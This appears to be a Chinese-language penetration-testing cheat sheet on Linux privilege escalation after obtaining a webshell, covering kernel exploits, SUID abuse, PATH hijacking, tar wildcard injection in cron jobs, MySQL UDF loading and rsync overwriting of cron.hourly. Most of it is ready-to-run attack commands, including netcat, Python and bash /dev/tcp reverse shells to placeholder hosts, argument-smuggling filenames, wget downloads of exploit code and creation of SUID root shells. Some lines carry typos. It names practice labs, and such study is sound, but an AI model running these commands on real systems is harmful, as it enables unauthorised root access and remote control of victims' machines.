# 权限提升——Linux提权

## 提权辅助工具

1. 信息收集：
   - [LinEnum](https://github.com/rebootuser/LinEnum)
   - [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

2. 漏洞探针：
   - [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
   - [linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)

## Linux内核漏洞提权

1. 简介

   通常我们在拥有一个webshell的时候，一般都是WEB容器权限，如在IIS就是IIS用户组权限，在apache就是apache权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户、网络信息、IP信息等。如果想进行内网渗透就必须将权限提权到最高，如系统权限、超级管理员权限。

2. 创建交互shell。linux提权需要交互shell，可以使用工具perl-reverse-shell.pl等建立sockets，本地使用nc监听端口

3. 探针项目：

   - [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
   - [linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)

4. 查看发行版

   ``` shell
   cat /etc/issue
   cat /etc/*release
   ```

   查看内核版本

   ``` shell
   uname -a
   ```

5. 查找可用的exp。exploit-db、github上公开的漏洞exp等

6. 将exp脚本上传到服务器中，赋权执行

## linux suid提权

1. suid是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行

   suid是一种对二进制程序进行设置的特殊权限，可以让二进制程序的执行者临时拥有属主的权限（仅对拥有执行权限的二进制程序有效。

2. 漏洞成因：chmod u+s给予了suid u-s删除了suid，使程序在运行中受到了suid root权限的执行过程导致
3. 提权过程：探针是否有SUID(手工或脚本)->特定SUID利用->利用

4. 手工命令探针安全漏洞，寻找二进制可执行文件

   ``` shell
   find / -user root -perm -4000 -print 2>/dev/null
   find / -perm -u=s -type f 2>/dev/null
   find / -user root -perm -4000 -exec ls -ldb {} \;
   ```

5. 脚本项目探针安全漏洞，参考：[suid-executables](https://pentestlab.blog/2017/09/25/suid-executables/)

   ``` shell
   LinEnum.sh linuxprivchecker.py
   touch shell
   find shell -exec whoami \;
   ```

6. 利用NC反弹

   ``` shell
   find shell -exec netcat -lvp PORT -e /bin/sh \;
   netcat xx.xx.xx.xx PORT
   ```

7. 利用Python反弹

   ``` shell
   find xiaodi -exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;
   
   nc -lvp PORT
   ```

## 环境变量覆盖提权

1. 条件：ROOT用户对某个第三方程序给予了SUID权限

2. 探针

   ```shell
   find / -user root -perm -4000 -print 2>/dev/null
   ```

3. root用户将可执行文件进行编译，保证文件的正常授权运行，给予ROOT权限执行

   ``` shell
   gcc demo.c -o shell
   chmod u+s shell
   //demo.c源码如下
   #include <unistd.h>
   void main()
   {
   setuid(0);
   setgid(0);
   system("ps");
   }
   ```

4. 普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限

   ``` shell
   cp /bin/bash /tmp/ps  //将/bin/bash复制到/tmp/ps
   export PATH=/tmp:$PATH  //将tmp添加到环境变量
   ./shell //shell是demo.c编译出来的
   id
   ```

## 计划任务提权

1. 通过获取计划任务执行文件信息进行提权，查看计划任务有无以下问题
   - 相对路径和绝对路径执行
   - 计划任务命令存在参数调用

2. 利用计划任务的备份功能tar命令的参数利用

   - ``` shell
     echo "" > "--checkpoint-action=exec=sh test.sh" 
     //创建名为--checkpoint-action=exec=sh test.sh的文件
     echo "" > --checkpoint=1
     //创建名为--checkpoint=1的文件
     echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > test.sh
     //将获取bash的提权命令cp /bin/bash /tmp/bash; chmod +s /tmp/bash写入test.sh文件
     ```

   - 当计划任务的备份功能被执行时，会通过参数传递调用test.sh文件，从而执行提权命令

   - 计划任务执行后，需要进入/tmp目录执行`bash -p`命令才能成功提权 

3. 利用不安全的权限分配操作导致的定时文件覆盖。由于权限分配操作不当，导致具有root权限的计划任务文件可被其他低权限用户修改，攻击者可通过修改计划任务文件，在内容中加入自定义命令并保存，当计划任务执行该文件时，即可导致提权

## 数据库mysql-udf.so提权

1. 靶场：[vulnhub-raven](https://www.vulnhub.com/entry/raven-2,269/)

2. 下载mysql udf poc进行编译

   ``` shell
   wget https://www.exploit-db.com/download/1518
   mv 1518 raptor_udf.c
   gcc -g -c raptor_udf.c
   gcc -g -shared -o raptor_udf.so raptor_udf.o -lc
   mv raptor_udf.so 1518.so
   ```

3. 传或下载1518到目标服务器

   ``` shell
   wget https://xx.xx.xx.xx/1518.so
   ```

4. 进入数据库进行UDF导出

   ``` shell
   use mysql;
   create table foo(line blob);
   insert into foo values(load_file('/tmp/1518.so'));
   select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
   ```

5. 创建do_system函数调用

   ``` shell
   create function do_system returns integer soname '1518.so';
   select do_system('chmod u+s /usr/bin/find');
   ```

6. 配合使用find调用执行

   ``` shell
   touch xiaodi
   find xiaodi –exec "whoami" \;
   find xiaodi –exec "/bin/sh" \;
   id
   ```

## Rsync服务提权

1. Rsync是linux下一款数据备份工具，默认开启873端口。借助Linux默认计划任务调用/etc/cron.hourly，利用rsync连接覆盖

2. 靶场：[vulhub-rsync](https://vulhub.org/#/environments/rsync/common/)

3. 提权过程

   - 创建一个shell文件，内容

   ``` shell 
   bash bash -i >& /dev/tcp/ip/port 0>&1
   ```

   - 赋予执行权限

     ``` shell
     chomd +x shell
     ```

   - 上传文件覆盖定时任务目录下

     ``` shell
     rsync -av shell rsync://ip:873/src/etc/cron.hourly
     ```

   - 进行nc 监听相应的端口

     ``` shell
     nc -lvvp port
     ```